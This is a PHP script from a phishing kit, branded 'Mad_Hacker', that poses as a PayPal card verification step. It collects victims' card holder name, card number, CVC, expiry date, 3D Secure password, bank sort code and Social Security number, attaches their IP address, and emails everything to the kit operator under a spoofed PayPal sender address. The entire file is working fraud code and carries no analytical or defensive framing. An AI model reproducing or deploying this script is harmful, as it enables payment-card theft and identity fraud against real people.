<?php

/*
 __  __           _     _   _            _             
|  \/  | __ _  __| |   | | | | __ _  ___| | _____ _ __ 
| |\/| |/ _` |/ _` |   | |_| |/ _` |/ __| |/ / _ \ '__|
| |  | | (_| | (_| |   |  _  | (_| | (__|   <  __/ |   
|_|  |_|\__,_|\__,_|___|_| |_|\__,_|\___|_|\_\___|_|   
                  |_____|                              

     _             _                      
  __| |_   _  __ _| |   ___ ___  _ __ ___ 
 / _` | | | |/ _` | |  / __/ _ \| '__/ _ \
| (_| | |_| | (_| | | | (_| (_) | | |  __/
 \__,_|\__,_|\__,_|_|  \___\___/|_|  \___|
                                          

*/

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);


{
$message .= "=========[VBV INFOS]=========\n";
$message .= "Card Holder		: ".$_POST['naonca']."\n";
$message .= "Card Number		: ".$_POST['cnum']."\n";
$message .= "CVC			  : ".$_POST['c22d']."\n";
$message .= "Exp Date		: ".$_POST['emonth']."/".$_POST['eyear']."\n";
$message .= "3D / VBV		: ".$_POST['_3d']."\n";
$message .= "Sort Code		: ".$_POST['c522a']."\n";
$message .= "SSN			  : ".$_POST['ca22']."\n";
$message .= "===============[IP]==============\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip\n";
$message .= "=========[VBV INFOS]=========";

include 'MonEmail.php';
$subject = "VBV INFOS FROM [$ip]";
$headers = "From: PayPal RZLT <paypal@support.com>";
$headers .= "MIME-Version: 1.0\n";
mail($to, $subject, $message,$headers);
include 'img.php';
$subject = "VBV INFOS FROM [$ip]";
$headers = "From: PayPal RZLT <paypal@support.com>";
$headers .= "MIME-Version: 1.0\n";
mail($to, $subject, $message,$headers);
}

include 'css/anti_Boot3.php';

?>
